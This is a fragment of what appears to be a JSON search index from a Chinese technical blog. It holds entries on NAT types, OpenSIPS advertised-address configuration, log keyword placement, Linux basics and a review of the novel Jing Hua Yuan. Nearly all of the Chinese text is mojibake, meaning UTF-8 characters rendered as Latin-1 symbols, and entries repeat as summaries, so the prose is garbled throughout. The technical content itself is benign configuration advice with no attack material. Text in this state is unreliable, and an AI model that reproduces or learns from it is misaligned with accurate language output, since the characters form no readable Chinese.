ç«¯å£é™åˆ¶å‹é™¤äº†æœ‰é™åˆ¶é”¥å‹çš„è¦æ±‚å¤–ï¼Œè¿˜å¢åŠ äº†ç«¯å£çš„é™åˆ¶ 4. å¯¹ç§°å‹ å¯¹ç§°å‹æœ€éš¾ç©¿é€ï¼Œå› ä¸ºæ¯æ¬¡äº¤äº’NATéƒ½ä¼šä½¿ç”¨ä¸åŒçš„ç«¯å£å·ï¼Œæ‰€ä»¥å†…å¤–ç½‘ç«¯å£æ˜ å°„æ ¹æœ¬æ— æ³•é¢„æµ‹ NATå¯¹æ¯”è¡¨æ ¼ NATç±»å‹ æ”¶æ•°æ®å‰æ˜¯å¦éœ€è¦å…ˆå‘é€æ•°æ® æ˜¯å¦èƒ½å¤Ÿé¢„æµ‹ä¸‹ä¸€æ¬¡çš„NATæ‰“å¼€çš„ç«¯å£å¯¹ æ˜¯å¦é™åˆ¶åŒ…çš„ç›®çš„ip:port å…¨é”¥å½¢ å¦ æ˜¯ å¦ é™åˆ¶é”¥å½¢ æ˜¯ æ˜¯ ä»…é™åˆ¶IP ç«¯å£é™åˆ¶å‹ æ˜¯ æ˜¯ æ˜¯ å¯¹ç§°å‹ æ˜¯ å¦ æ˜¯ ","permalink":"https://wdd.js.org/opensips/ch1/deep-in-nat/","summary":" NATçš„äº§ç”ŸåŸå› æ˜¯IPv4çš„åœ°å€ä¸å¤Ÿç”¨ï¼Œç½‘ç»œä¸­çš„éƒ¨åˆ†ä¸»æœºåªèƒ½å…¬ç”¨ä¸€ä¸ªå¤–ç½‘IPã€‚ NATå·¥ä½œåœ¨ç½‘ç»œå±‚å’Œä¼ è¾“å±‚ï¼Œä¸»è¦æ˜¯å¯¹IPåœ°å€å’Œç«¯å£å·çš„æ”¹å˜ NATçš„ä¼˜ç‚¹ èŠ‚çº¦å…¬ç½‘IP å®‰å…¨æ€§æ›´å¥½ï¼Œæ‰€æœ‰æµé‡éƒ½éœ€è¦ç»è¿‡å…¥å£çš„é˜²ç«å¢™ NATçš„ç¼ºç‚¹ å¯¹äºUPDåº”ç”¨ä¸å¤Ÿå‹å¥½ NAT å·¥ä½œåŸç† å†…éƒ¨çš„è®¾å¤‡X, ç»è¿‡NATè®¾å¤‡åï¼ŒNATè®¾å¤‡ä¼šæ”¹å†™æºIPå’Œç«¯å£ NAT ç±»å‹ 1. å…¨é”¥å‹ æ¯ä¸ªå†…éƒ¨ä¸»æœºéƒ½æœ‰ä¸€ä¸ªé™æ€ç»‘å®šçš„å¤–éƒ¨ip:port ä»»ä½•ä¸»æœºå‘å¾€NATè®¾å¤‡ä¸Šç‰¹å®šip:portçš„åŒ…ï¼Œéƒ½ä¼šè¢«è½¬å‘ç»™ç»‘å®šçš„ä¸»æœº è¿™ç§æ–¹å¼çš„ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œé»‘å®¢å¯ä»¥ä½¿ç”¨ç«¯å£æ‰«æå·¥å…·ï¼Œæ‰«æå‡ºæš´éœ²çš„ç«¯å£ï¼Œç„¶åé€šè¿‡è¿™ä¸ªç«¯å£æ”»å‡»å†…éƒ¨ä¸»æœº åœ¨å†…éƒ¨ä¸»æœºæ²¡æœ‰å¾€å¤–å‘é€æµé‡æ—¶ï¼Œå¤–éƒ¨æµé‡ä¹Ÿèƒ½å¤Ÿè¿›å…¥å†…éƒ¨ä¸»æœº -\n2. é™åˆ¶é”¥å½¢ NATä¸Šçš„ip:portä¸å†…éƒ¨ä¸»æœºæ˜¯åŠ¨æ€ç»‘å®šçš„ å¦‚æœå†…éƒ¨ä¸»æœºæ²¡æœ‰å‘æŸä¸ªä¸»æœºå…ˆå‘é€è¿‡åŒ…ï¼Œé‚£ä¹ˆNATä¼šæ‹’ç»å¤–éƒ¨ä¸»æœºè¿›å…¥çš„æµé‡ 3. ç«¯å£é™åˆ¶å‹ ç«¯å£é™åˆ¶å‹é™¤äº†æœ‰é™åˆ¶é”¥å‹çš„è¦æ±‚å¤–ï¼Œè¿˜å¢åŠ äº†ç«¯å£çš„é™åˆ¶ 4. å¯¹ç§°å‹ å¯¹ç§°å‹æœ€éš¾ç©¿é€ï¼Œå› ä¸ºæ¯æ¬¡äº¤äº’NATéƒ½ä¼šä½¿ç”¨ä¸åŒçš„ç«¯å£å·ï¼Œæ‰€ä»¥å†…å¤–ç½‘ç«¯å£æ˜ å°„æ ¹æœ¬æ— æ³•é¢„æµ‹ NATå¯¹æ¯”è¡¨æ ¼ NATç±»å‹ æ”¶æ•°æ®å‰æ˜¯å¦éœ€è¦å…ˆå‘é€æ•°æ® æ˜¯å¦èƒ½å¤Ÿé¢„æµ‹ä¸‹ä¸€æ¬¡çš„NATæ‰“å¼€çš„ç«¯å£å¯¹ æ˜¯å¦é™åˆ¶åŒ…çš„ç›®çš„ip:port å…¨é”¥å½¢ å¦ æ˜¯ å¦ é™åˆ¶é”¥å½¢ æ˜¯ æ˜¯ ä»…é™åˆ¶IP ç«¯å£é™åˆ¶å‹ æ˜¯ æ˜¯ æ˜¯ å¯¹ç§°å‹ æ˜¯ å¦ æ˜¯ ","title":"æ·±å…¥NATç½‘ç»œ"},{"content":"å¦‚æœä½ ä»…ä»…æ˜¯æœ¬åœ°è¿è¡ŒOpenSIPS, ä½ å¯ä»¥ä¸ç”¨ç®¡ä»€ä¹ˆå¯¹å¤–å…¬å¸ƒåœ°å€ã€‚ä½†æ˜¯å¦‚æœä½ çš„SIPæœåŠ¡å™¨æƒ³åœ¨å…¬ç½‘ç¯å¢ƒæä¾›æœåŠ¡ï¼Œåˆ™å¿…ç„¶è¦æ·±åˆ»çš„ç†è§£å¯¹å¤–å…¬å¸ƒåœ°å€ã€‚\nåœ¨ä¸€ä¸ªé›†ç¾¤ä¸­ï¼Œå¯èƒ½æœ‰å¤šå°SIPæœåŠ¡å™¨ï¼Œä¾‹å¦‚å¦‚ä¸‹å›¾çš„ç½‘ç»œæ¶æ„ä¸­\nregister è´Ÿè´£æ³¨å†Œç›¸å…³çš„ä¸šåŠ¡ 192.168.1.100(å†…ç½‘) uas è´Ÿè´£å‘¼å«ç›¸å…³çš„ä¸šåŠ¡ 192.168.1.101(å†…ç½‘) entry è´Ÿè´£æ¥å…¥ 192.168.1.102(å†…ç½‘)ï¼Œ1.2.3.4(å…¬ç½‘åœ°å€) ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œregisterå’Œuasåªæœ‰å†…å¤–åœ°å€ï¼Œæ²¡æœ‰å…¬ç½‘åœ°å€ã€‚è€Œentryæ—¢æœ‰å†…ç½‘åœ°å€ï¼Œä¹Ÿæœ‰å…¬ç½‘åœ°å€ã€‚å…¬ç½‘åœ°å€ä¸€èˆ¬æ˜¯ç”±äº‘æœåŠ¡æä¾›å•†åˆ†é…çš„ã€‚\næˆ‘ä»¬å¸Œæœ›å†…éƒ¨ç½‘ç»œregisterå’Œuasä»¥åŠentryå¿…é¡»ä½¿ç”¨å†…ç½‘é€šä¿¡ï¼Œè€Œentryå’Œäº’è”ç½‘ä½¿ç”¨å…¬ç½‘é€šä¿¡ã€‚\næœ‰æ—¶å€™ç»å¸¸é‡åˆ°çš„é—®é¢˜å°±æ˜¯æŸä¸ªè¯·æ±‚ï¼Œä¾‹å¦‚INVITE, uasä»å†…ç½‘åœ°å€å‘é€åˆ°äº†entryçš„å…¬ç½‘åœ°å€ä¸Šï¼Œè¿™æ—¶å€™å°±å¯èƒ½äº§ç”Ÿä¸€äº›åˆ—çš„å¥‡è‘©é—®é¢˜ã€‚\nå¦‚ä½•è®¾ç½®å…¬å¸ƒåœ°å€ listen as listen = udp:192.168.1.102:5060 as 1.2.3.4:5060 åœ¨listen çš„å‚æ•°ä¸Šç›´æ¥é…ç½®å…¬å¸ƒåœ°å€ã€‚å¥½å¤„çš„æ–¹ä¾¿ï¼Œåç»­å¦‚æœè°ƒç”¨record_route()æˆ–è€…add_path_received(), OpenSIPSä¼šè‡ªåŠ¨å¸®ä½ é€‰æ‹©å¯¹å¤–å…¬å¸ƒåœ°å€ã€‚\nä½†æ˜¯ï¼ŒOpenSIPSé€‰æ‹©å¯èƒ½å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚\nä¾‹å¦‚ï¼š INVITEè¯·æ±‚ä»å†…éƒ¨å‘é€åˆ°äº’è”ç½‘ï¼Œè¿™æ—¶OpenSIPSèƒ½æ­£å¸¸è®¾ç½®å¯¹å¤–å…¬å¸ƒåœ°å€ã€‚ä½†æ˜¯å¦‚æœè¯·æ±‚ä»å¤–è¡¨è¿›å…¥å†…éƒ¨ï¼ŒOpenSIPSå¯èƒ½è¿˜æ˜¯ä¼šç”¨å…¬ç½‘åœ°å€ä½œä¸ºå¯¹å¤–å…¬å¸ƒåœ°å€ã€‚\næ‰€ä»¥ï¼Œlisten asè™½ç„¶æ–¹ä¾¿ï¼Œä½†ä¸å¤Ÿçµæ´»ã€‚\nset_advertised_address() å’Œ set_advertised_port(int) set_advertised_addresså’Œset_advertised_portå±äºOpenSIPSå’Œæ ¸å¿ƒå‡½æ•°éƒ¨åˆ†ï¼Œå¯ä»¥åœ¨è„šæœ¬é‡Œæ ¹æ®ä¸åŒæ¡ä»¶ï¼Œçµæ´»çš„è®¾ç½®å…¬å¸ƒåœ°å€ã€‚\nä¾‹å¦‚:\nif è¯·æ±‚å‘ç”Ÿåˆ°å…¬ç½‘ { set_advertised_address(\u0026#34;1.2.3.4\u0026#34;); } âš ï¸ å¦‚æœä½ é€‰æ‹©ç”¨set_advertised_addresså’Œset_advertised_portæ¥æ‰‹åŠ¨è®¾ç½®ï¼Œå°±åƒä¸‡ä¸è¦ç”¨asäº†ã€‚\nå‡ ä¸ªæ³¨æ„ç‚¹SIPå¤´ record_routeå¤´ Pathå¤´ ä¸Šé¢çš„ä¸¤ä¸ªå¤´ï¼Œåœ¨OpenSIPSé‡Œå¯ä»¥ç”¨ä¸‹é¢çš„å‡½æ•°å»è®¾ç½®ã€‚è®¾ç½®çš„æ—¶å€™ï¼ŒåŠ¡å¿…è¦ä¸»ä¹‰é€‰æ‹©åˆé€‚çš„ç½‘ç»œåœ°å€ã€‚å¦è€…è¯·æ±‚å°†ä¼šä¸å›æŒ‰ç…§ä½ æœŸæœ›æ–¹å¼å‘é€ã€‚\nrecord_route record_route_preset add_path add_path_received ","permalink":"https://wdd.js.org/opensips/ch5/adv-address/","summary":"å¦‚æœä½ ä»…ä»…æ˜¯æœ¬åœ°è¿è¡ŒOpenSIPS, ä½ å¯ä»¥ä¸ç”¨ç®¡ä»€ä¹ˆå¯¹å¤–å…¬å¸ƒåœ°å€ã€‚ä½†æ˜¯å¦‚æœä½ çš„SIPæœåŠ¡å™¨æƒ³åœ¨å…¬ç½‘ç¯å¢ƒæä¾›æœåŠ¡ï¼Œåˆ™å¿…ç„¶è¦æ·±åˆ»çš„ç†è§£å¯¹å¤–å…¬å¸ƒåœ°å€ã€‚\nåœ¨ä¸€ä¸ªé›†ç¾¤ä¸­ï¼Œå¯èƒ½æœ‰å¤šå°SIPæœåŠ¡å™¨ï¼Œä¾‹å¦‚å¦‚ä¸‹å›¾çš„ç½‘ç»œæ¶æ„ä¸­\nregister è´Ÿè´£æ³¨å†Œç›¸å…³çš„ä¸šåŠ¡ 192.168.1.100(å†…ç½‘) uas è´Ÿè´£å‘¼å«ç›¸å…³çš„ä¸šåŠ¡ 192.168.1.101(å†…ç½‘) entry è´Ÿè´£æ¥å…¥ 192.168.1.102(å†…ç½‘)ï¼Œ1.2.3.4(å…¬ç½‘åœ°å€) ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œregisterå’Œuasåªæœ‰å†…å¤–åœ°å€ï¼Œæ²¡æœ‰å…¬ç½‘åœ°å€ã€‚è€Œentryæ—¢æœ‰å†…ç½‘åœ°å€ï¼Œä¹Ÿæœ‰å…¬ç½‘åœ°å€ã€‚å…¬ç½‘åœ°å€ä¸€èˆ¬æ˜¯ç”±äº‘æœåŠ¡æä¾›å•†åˆ†é…çš„ã€‚\næˆ‘ä»¬å¸Œæœ›å†…éƒ¨ç½‘ç»œregisterå’Œuasä»¥åŠentryå¿…é¡»ä½¿ç”¨å†…ç½‘é€šä¿¡ï¼Œè€Œentryå’Œäº’è”ç½‘ä½¿ç”¨å…¬ç½‘é€šä¿¡ã€‚\næœ‰æ—¶å€™ç»å¸¸é‡åˆ°çš„é—®é¢˜å°±æ˜¯æŸä¸ªè¯·æ±‚ï¼Œä¾‹å¦‚INVITE, uasä»å†…ç½‘åœ°å€å‘é€åˆ°äº†entryçš„å…¬ç½‘åœ°å€ä¸Šï¼Œè¿™æ—¶å€™å°±å¯èƒ½äº§ç”Ÿä¸€äº›åˆ—çš„å¥‡è‘©é—®é¢˜ã€‚\nå¦‚ä½•è®¾ç½®å…¬å¸ƒåœ°å€ listen as listen = udp:192.168.1.102:5060 as 1.2.3.4:5060 åœ¨listen çš„å‚æ•°ä¸Šç›´æ¥é…ç½®å…¬å¸ƒåœ°å€ã€‚å¥½å¤„çš„æ–¹ä¾¿ï¼Œåç»­å¦‚æœè°ƒç”¨record_route()æˆ–è€…add_path_received(), OpenSIPSä¼šè‡ªåŠ¨å¸®ä½ é€‰æ‹©å¯¹å¤–å…¬å¸ƒåœ°å€ã€‚\nä½†æ˜¯ï¼ŒOpenSIPSé€‰æ‹©å¯èƒ½å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚\nä¾‹å¦‚ï¼š INVITEè¯·æ±‚ä»å†…éƒ¨å‘é€åˆ°äº’è”ç½‘ï¼Œè¿™æ—¶OpenSIPSèƒ½æ­£å¸¸è®¾ç½®å¯¹å¤–å…¬å¸ƒåœ°å€ã€‚ä½†æ˜¯å¦‚æœè¯·æ±‚ä»å¤–è¡¨è¿›å…¥å†…éƒ¨ï¼ŒOpenSIPSå¯èƒ½è¿˜æ˜¯ä¼šç”¨å…¬ç½‘åœ°å€ä½œä¸ºå¯¹å¤–å…¬å¸ƒåœ°å€ã€‚\næ‰€ä»¥ï¼Œlisten asè™½ç„¶æ–¹ä¾¿ï¼Œä½†ä¸å¤Ÿçµæ´»ã€‚\nset_advertised_address() å’Œ set_advertised_port(int) set_advertised_addresså’Œset_advertised_portå±äºOpenSIPSå’Œæ ¸å¿ƒå‡½æ•°éƒ¨åˆ†ï¼Œå¯ä»¥åœ¨è„šæœ¬é‡Œæ ¹æ®ä¸åŒæ¡ä»¶ï¼Œçµæ´»çš„è®¾ç½®å…¬å¸ƒåœ°å€ã€‚\nä¾‹å¦‚:\nif è¯·æ±‚å‘ç”Ÿåˆ°å…¬ç½‘ { set_advertised_address(\u0026#34;1.2.3.4\u0026#34;); } âš ï¸ å¦‚æœä½ é€‰æ‹©ç”¨set_advertised_addresså’Œset_advertised_portæ¥æ‰‹åŠ¨è®¾ç½®ï¼Œå°±åƒä¸‡ä¸è¦ç”¨asäº†ã€‚\nå‡ ä¸ªæ³¨æ„ç‚¹SIPå¤´ record_routeå¤´ Pathå¤´ ä¸Šé¢çš„ä¸¤ä¸ªå¤´ï¼Œåœ¨OpenSIPSé‡Œå¯ä»¥ç”¨ä¸‹é¢çš„å‡½æ•°å»è®¾ç½®ã€‚è®¾ç½®çš„æ—¶å€™ï¼ŒåŠ¡å¿…è¦ä¸»ä¹‰é€‰æ‹©åˆé€‚çš„ç½‘ç»œåœ°å€ã€‚å¦è€…è¯·æ±‚å°†ä¼šä¸å›æŒ‰ç…§ä½ æœŸæœ›æ–¹å¼å‘é€ã€‚\nrecord_route record_route_preset add_path add_path_received ","title":"ã€å¿…è¯»ã€‘æ·±å…¥å¯¹å¤–å…¬å¸ƒåœ°å€"},{"content":"ä¸‹é¢çš„æ—¥å¿—æ˜¯æ‰“å°å‡ºsocket.ioæ–­å¼€çš„ä¿¡æ¯\n// bad logger.info(`socket.io ${socket.handshake.query.agentId} disconnect. reason: ${reason} ${socket.id}`) ä½†æ˜¯è¿™æ¡æ—¥å¿—ä¸åˆ©äºå…³é”®è¯æœç´¢ï¼Œå¦‚æœæœdisconnectï¼Œé‚£ä¹ˆå¯èƒ½å¾ˆå¤šåœ°æ–¹éƒ½æœ‰è¿™ä¸ªå…³é”®è¯ã€‚\n// good logger.info(`socket.io disconnect ${socket.handshake.query.agentId} reason: ${reason} ${socket.id}`) // bad logger.info(`socket.io ${socket.handshake.query.agentId} disconnect. reason: ${reason} ${socket.id}`) æ€»ç»“ç»éªŒ\nå¤šä¸ªå…³é”®è¯ä½ç½®è¦é å‰ å¤šä¸ªå…³é”®è¯è¦é›†ä¸­ æ—¥å¿—æ—¥å¿—è¦æ ‡è®°æ¥è‡ªç‰¹æ®Šçš„ç”¨äºï¼Œæ¯”å¦‚è¯´ï¼Œæ¥è‡ª ","permalink":"https://wdd.js.org/posts/2019/11/xa694b/","summary":"ä¸‹é¢çš„æ—¥å¿—æ˜¯æ‰“å°å‡ºsocket.ioæ–­å¼€çš„ä¿¡æ¯\n// bad logger.info(`socket.io ${socket.handshake.query.agentId} disconnect. reason: ${reason} ${socket.id}`) ä½†æ˜¯è¿™æ¡æ—¥å¿—ä¸åˆ©äºå…³é”®è¯æœç´¢ï¼Œå¦‚æœæœdisconnectï¼Œé‚£ä¹ˆå¯èƒ½å¾ˆå¤šåœ°æ–¹éƒ½æœ‰è¿™ä¸ªå…³é”®è¯ã€‚\n// good logger.info(`socket.io disconnect ${socket.handshake.query.agentId} reason: ${reason} ${socket.id}`) // bad logger.info(`socket.io ${socket.handshake.query.agentId} disconnect. reason: ${reason} ${socket.id}`) æ€»ç»“ç»éªŒ\nå¤šä¸ªå…³é”®è¯ä½ç½®è¦é å‰ å¤šä¸ªå…³é”®è¯è¦é›†ä¸­ æ—¥å¿—æ—¥å¿—è¦æ ‡è®°æ¥è‡ªç‰¹æ®Šçš„ç”¨äºï¼Œæ¯”å¦‚è¯´ï¼Œæ¥è‡ª ","title":"æ‰“å°æ˜“äºæå–å…³é”®è¯çš„æ—¥å¿—"},{"content":"Â äº”å¤§å•å…ƒ è¾“å…¥å•å…ƒ CPUï¼šç®—æœ¯ï¼Œé€»è¾‘ï¼Œå†…å­˜ è¾“å‡ºå•å…ƒ æŒ‡ä»¤é›† ç²¾ç®€æŒ‡ä»¤é›† ç¦ä»”æŒ‡ä»¤é›† ","permalink":"https://wdd.js.org/posts/2019/11/qy6ugu/","summary":"Â äº”å¤§å•å…ƒ è¾“å…¥å•å…ƒ CPUï¼šç®—æœ¯ï¼Œé€»è¾‘ï¼Œå†…å­˜ è¾“å‡ºå•å…ƒ æŒ‡ä»¤é›† ç²¾ç®€æŒ‡ä»¤é›† ç¦ä»”æŒ‡ä»¤é›† ","title":"Linuxç§æˆ¿èœ"},{"content":"ã€Šé•œèŠ±ç¼˜ã€‹æ˜¯æ¸…ä»£ææ±çå†™çš„ä¸€éƒ¨é•¿ç¯‡å°è¯´ï¼Œå°è¯´å‰åŠéƒ¨åˆ†æ˜¯ä¸»è§’æ¸¸å†æµ·å¤–å„å›½çš„æ¸…ä»£ç»å†ï¼Œæœ‰ç‚¹åƒæ—¥æœ¬åŠ¨æ¼«æµ·è´¼ç‹ã€‚ååŠéƒ¨åˆ†æ¯”è¾ƒæ— è¶£ï¼Œç•¥è¿‡ä¸æã€‚\nå•è®²å°è¯´çš„å‰åŠéƒ¨åˆ†ï¼Œå°è¯´å‘ç”Ÿåœ¨å”ä»£ï¼Œä¸»è§’å«åšå”æ•–ï¼Œæœ¬æ¥ç§‘ä¸¾ä¸­äº†æ¢èŠ±ï¼Œä½†æ˜¯å› ä¸ºä»–å’Œè®¨ä¼æ­¦åˆ™å¤©çš„å¾æ•¬ä¸šæœ‰ç»“æ‹œä¹‹äº¤ï¼Œè¢«äººå‘Šå‘ï¼Œé‚é©å»äº†æ¢èŠ±ï¼Œé™ä¸ºç§€æ‰ã€‚\nå”æ•–å¿ƒç°æ„å†·ï¼Œç…®ç†Ÿçš„é¸­å­å°±è¿™ä¹ˆé£äº†ã€‚äºæ˜¯å†³å®šèˆå¼ƒåŠŸåï¼Œæ¸¸å†å±±æ°´ã€‚æ­£å¥½ä»–çš„å¦¹å¤«ï¼Œæ—ä¹‹æ´‹æ˜¯ä¸ªè·‘è¿œæ´‹è´¸æ˜“çš„ã€‚\nå”æ•–æ­£å¥½æ­ä¸Šäº†å¦¹å¤«çš„é¡ºé£èˆ¹ï¼Œç¯æ¸¸ä¸–ç•Œä¹‹æ—…å°±è¿™ä¹ˆå¼€å§‹äº†ï¼ï¼\n1. å›å­å›½ å›å­å›½è®²ç©¶å¥½è®©ä¸æ­£ï¼ŒæƒŸå–„ä¸ºå®ã€‚è¯´çš„æ˜¯è¿™ä¸ªå›½å®¶çš„äººå•Šï¼Œç´ è´¨éå¸¸é«˜ï¼Œé«˜åˆ°ä»€ä¹ˆåœ°æ­¥å‘¢ï¼Ÿé«˜åˆ°æœ‰ç‚¹åäººç±»ã€‚\nä¸‹é¢çš„ä¸€ä¸ªåœºæ™¯ï¼Œæ˜¯æˆ‘ä»å°è¯´ä¸­ç®€åŒ–çš„ä¸€ä¸ªåœºæ™¯ï¼š\nä¹°å®¶è¯´ï¼šè€æ¿ï¼Œä½ çš„ä¸œè¥¿è´¨é‡çœŸå¥½ï¼Œä»·æ ¼å´é‚£ä¹ˆä½ï¼Œå¦‚æœæˆ‘ä¹°äº†å»ï¼Œæˆ‘å†…å¿ƒä¼šä¸å®‰çš„ã€‚è·ªæ±‚ä½ æŠ¬é«˜äº›ä»·æ ¼ï¼Œæˆ‘æ‰ä¹°ï¼Œä¸ç„¶æˆ‘å°±ä¸ä¹°äº†ã€‚\nåº—é“ºè€æ¿è¯´ï¼šæˆ‘è¦çš„ä»·æ ¼è¿™ä¹ˆé«˜ï¼Œå·²ç»è§‰å¾—è¿‡æ„ä¸å»äº†ï¼Œå¦‚æœä½ è¿˜è®©æˆ‘æ¶¨ä»·ï¼Œè¿˜ä½ è¿˜æ˜¯å»åˆ«çš„åœ°æ–¹ä¹°ä¸œè¥¿å§ã€‚\nä¹°å®¶è¯´ï¼šæ—¢ç„¶ä½ ä¸æ„¿æ„æ¶¨ä»·ï¼Œé‚£ä¹Ÿè¡Œï¼Œæˆ‘è¿˜æŒ‰ç…§è¿™ä¸ªä»·æ ¼ä¹°ä½ çš„ä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘åªæ‹¿ä¸€åŠä¸œè¥¿èµ°ã€‚\næ˜¯ä¸æ˜¯å¾ˆåäººç±»ï¼Œä»æ¥åªè§è¿‡ä¹°å®¶æƒ³è¦å‹ä½ä»·æ ¼çš„ï¼Œè¿˜æœªå¬è¯´è¿‡ä¹°å®¶æƒ³æŠ¬é«˜ä»·æ ¼çš„ã€‚\n2. å¤§äººå›½ æ­¤å¤„çš„å¤§äººå›½ï¼Œå¹¶ä¸æ˜¯è¯´ä»–ä»¬çš„èº«æå·¨å¤§ï¼Œè€Œæ˜¯å½¢å®¹ä»–ä»¬å›½äººçš„å“æ ¼é«˜å¤§ã€‚ä»–ä»¬éƒ½æ˜¯äº‰ç›¸åšå–„äº‹ï¼Œä¸ä½œæ¶äº‹ã€‚\né™¤æ­¤ä»¥å¤–ï¼Œåœ¨ä»–ä»¬çš„å›½å®¶ï¼Œå¾ˆå®¹æ˜“åŒºåˆ†å¥½äººå’Œåäººã€‚ä»–ä»¬æ‰€æœ‰çš„äººè„šä¸‹éƒ½è¸©ç€äº‘ã€‚å…‰æ˜æ­£å¤§çš„äººï¼Œè„šä¸‹æ˜¯å½©äº‘ï¼›ç»å¸¸åšåäº‹çš„äººï¼Œè„šä¸‹æ˜¯é»‘äº‘ã€‚\näº‘çš„è‰²å½©ä¼šéšç€äººçš„å“è¡Œè€Œå˜åŒ–ï¼Œåäººå¦‚æœèƒ½å¤Ÿå‘å–„ï¼Œè¶³ä¸‹ä¹Ÿä¼šäº§ç”Ÿå½©äº‘ã€‚\næœ‰äº›å¤§å®˜äººï¼Œä¸å¸Œæœ›åˆ«äººçœ‹åˆ°ä»–ä»¬è„šä¸‹äº‘çš„é¢œè‰²ï¼Œæ‰€ä»¥ä¼šç”¨å¸ƒè£¹ä¸Šï¼Œä½†æ˜¯è¿™æ ·åšå²‚ä¸æ˜¯æ©è€³ç›—é“ƒå—ï¼Ÿ\n3. é»‘é½¿å›½ è¿™ä¸ªå›½å®¶çš„äººå…¨èº«é€šé»‘ï¼Œè¿ç‰™é½¿éƒ½æ˜¯é»‘çš„ã€‚æˆ‘æ€€ç–‘ä½œè€…æ˜¯ä¸æ˜¯å»è¿‡éæ´²ï¼Œä½†æ˜¯éæ´²äººçš„ç‰™é½¿å¾€å¾€éƒ½æ˜¯ç™½è‰²çš„ã€‚\nä½†æ˜¯äººä¸å¯è²Œç›¸ï¼Œé»‘é½¿å›½çš„äººéå¸¸å–œæ¬¢è¯»ä¹¦ï¼Œä¸ªä¸ªéƒ½æ˜¯æ»¡è…¹ç»çº¶ã€‚è€Œä¸”è¿™ä¸ªåœ°æ–¹çš„å°å·ï¼Œåªä¼šå·ä¹¦ï¼Œå´ä¸å·é‡‘é“¶å®ç‰©ã€‚\n4. åŠ³æ°‘å›½ è¯¥å›½çš„äººä¹Ÿæ˜¯é¢è‰²å¢¨é»‘ï¼Œèµ°è·¯éƒ½æ˜¯æ‘‡æ‘‡æ™ƒæ™ƒï¼Œç»ˆæ—¥å¿™å¿™ç¢Œç¢Œã€‚ä½†æ˜¯å‘¢ï¼Œè¿™ä¸ªå›½å®¶çš„äººæ¯ä¸ªéƒ½æ˜¯é•¿å¯¿ã€‚\n5. è‚è€³å›½ è‚è€³å›½çš„è€³æœµå¾ˆé•¿ï¼Œé•¿è€³åŠè…°ï¼Œèµ°è·¯éƒ½éœ€è¦ç”¨æ‰‹å»æ§ç€è€³æœµã€‚æ›´æœ‰ç”šè€…ï¼Œè€³æœµåŠåœ°ã€‚\né™¤äº†è€³æœµé•¿çš„è¿™ä¸ªç‰¹ç‚¹ä¹‹å¤–ï¼Œæœ‰çš„äººè€³æœµä¹Ÿç‰¹åˆ«å¤§ã€‚æ®è¯´å¯ä»¥ä¸€ä¸ªè€³æœµå½“åºŠå«ï¼Œä¸€ä¸ªè€³æœµå½“æ£‰è¢«ï¼Œç¡åœ¨è‡ªå·±çš„è€³æœµé‡Œã€‚\n6. æ— è‚ å›½ è¿™ä¸ªå›½å®¶çš„äººéƒ½æ²¡æœ‰è‚ å­ï¼Œæ— è®ºåƒå–ä»€ä¹ˆä¸œè¥¿ï¼Œéƒ½ä¼šç«‹å³æ’å‡ºä½“å¤–ã€‚æ‰€ä»¥ä»–ä»¬åœ¨åƒé¥­ä¹‹å‰ï¼Œéƒ½å…ˆæ‰¾å¥½å•æ‰€ï¼Œä¸ç„¶å°±å˜æˆéšåœ°å¤§å°ä¾¿äº†ã€‚\næ›´ä¸ºæ¶å¿ƒçš„æ˜¯ï¼Œå› ä¸ºä»–ä»¬åƒçš„å¿«ä¹Ÿæ‹‰çš„å¿«ï¼Œå¾ˆå¤šé£Ÿç‰©éƒ½æ²¡æœ‰æ¶ˆåŒ–å®Œå…¨ã€‚æ‰€ä»¥æœ‰äº›äººå°±æŠŠæ‹‰å‡ºæ¥çš„ä¾¿ä¾¿æ”¶é›†èµ·æ¥ï¼Œå†ç»™å…¶ä»–äººåƒã€‚\n7. é¬¼å›½ å›½äººå¤œæ™šä¸ç¡è§‰ï¼Œé¢ å€’ç™½å¤©é»‘å¤œï¼Œè¡Œä¸ºä¼¼é¬¼ã€‚\n8. æ¯›æ°‘å›½ å›½äººä¸€èº«é•¿æ¯›ï¼Œæ®è¯´æ˜¯ä¸Šä¸€ä¸–å¤ªä¸ºåå•¬ï¼Œä¸€æ¯›ä¸æ‹”ã€‚æ‰€ä»¥é˜ç‹è®©ä»–ä¸‹ä¸€ä¸–å‡ºç”Ÿåœ¨æ¯›æ°‘å›½ï¼Œè®©ä»–ä»¬æ»¡èº«é•¿æ»¡æ¯›ã€‚\n9. æ— ç»§å›½ å›½äººä»ä¸ç”Ÿè‚²ï¼Œä¹Ÿæ²¡æœ‰å­©å­ã€‚è€Œä¸”ä»–ä»¬ä¹Ÿä¸åŒºåˆ†ç”·å¥³ã€‚\nä¹‹æ‰€ä»¥ä»–ä»¬å›½å®¶çš„äººå£æ²¡æœ‰å‡å°‘ï¼Œæ˜¯å› ä¸ºäººæ­»å120å¹´ä¹‹åè¿˜ä¼šå†æ¬¡å¤æ´»ã€‚\næ‰€ä»¥ä»–ä»¬éƒ½æ˜¯æ­»äº†åˆæ´»ï¼Œæ´»äº†æœ‰æ­»ã€‚\n10. æ·±ç›®å›½ ä»–ä»¬è„¸ä¸Šæ²¡æœ‰çœ¼ç›ï¼Œä»–ä»¬çš„ä¸¤ä¸ªçœ¼ç›éƒ½é•¿åœ¨è‡ªå·±çš„æ‰‹æŒé‡Œã€‚æ˜¯ä¸æ˜¯è§‰å¾—ä¼¼æ›¾ç›¸è¯†å‘¢ï¼Ÿç«å½±é‡Œé¢çš„æˆ‘çˆ±ç½—ã€‚\n","permalink":"https://wdd.js.org/posts/2019/10/zfn92c/","summary":"ã€Šé•œèŠ±ç¼˜ã€‹æ˜¯æ¸…ä»£ææ±çå†™çš„ä¸€éƒ¨é•¿ç¯‡å°è¯´ï¼Œå°è¯´å‰åŠéƒ¨åˆ†æ˜¯ä¸»è§’æ¸¸å†æµ·å¤–å„å›½çš„æ¸…ä»£ç»å†ï¼Œæœ‰ç‚¹åƒæ—¥æœ¬åŠ¨æ¼«æµ·è´¼ç‹ã€‚ååŠéƒ¨åˆ†æ¯”è¾ƒæ— 